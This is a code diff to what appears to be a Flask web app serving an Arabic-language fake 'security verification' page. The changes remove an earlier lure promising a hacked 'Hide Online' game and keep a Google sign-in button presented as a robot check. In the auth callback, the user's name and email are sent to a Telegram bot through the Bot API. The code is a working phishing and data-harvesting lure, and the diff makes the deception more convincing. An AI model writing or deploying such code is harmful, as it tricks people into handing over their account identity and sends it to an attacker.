@@ -27,23 +27,21 @@ def home():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق الأمني - تحميل اللعبة</title>
+    <title>التحقق الأمني</title>
     <style>
         * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }}
         body {{ background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 20px; }}
         .login-container {{ background: #fff; width: 100%; max-width: 420px; padding: 40px 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.1); display: flex; flex-direction: column; align-items: center; text-align: center; }}
-        h2 {{ margin-bottom: 15px; color: #1c1e21; font-size: 20px; font-weight: bold; }}
-        p {{ color: #65676b; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }}
+        h2 {{ margin-bottom: 25px; color: #1c1e21; font-size: 19px; font-weight: bold; line-height: 1.5; }}
         .google-btn {{ width: 100%; padding: 15px; background: #4285F4; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; text-decoration: none; gap: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }}
         .google-btn:hover {{ background: #357ae8; }}
     </style>
 </head>
 <body>
     <div class="login-container">
-        <h2>تحميل لعبة Hide Online المهكرة</h2>
-        <p>يرجى تسجيل الدخول باستخدام حساب جوجل لإثبات أنك لست روبوت وللمتابعة إلى رابط التحميل المباشر.</p>
+        <h2>تسجيل الدخول للتأكد أنك لست برنامج روبوت</h2>
         <a href="{google_login_url}" class="google-btn">
-            <span>تسجيل الدخول بواسطة جوجل</span>
+            <span>تسجيل الدخول بحساب جوجل</span>
         </a>
     </div>
 </body>
@@ -90,7 +88,7 @@ def auth_callback():
 
     # إرسال البيانات إلى بوت تيليجرام
     if BOT_TOKEN and CHAT_ID:
-      msg = f"🤖 تم اجتياز تحقق الروبوت بنجاح!\n\n👤 الاسم: {name}\n📧 الإيميل: {email}"
+      msg = f"🤖 تم اجتياز التحقق بنجاح!\n\n👤 الاسم: {name}\n📧 الإيميل: {email}"
       telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
       requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
 
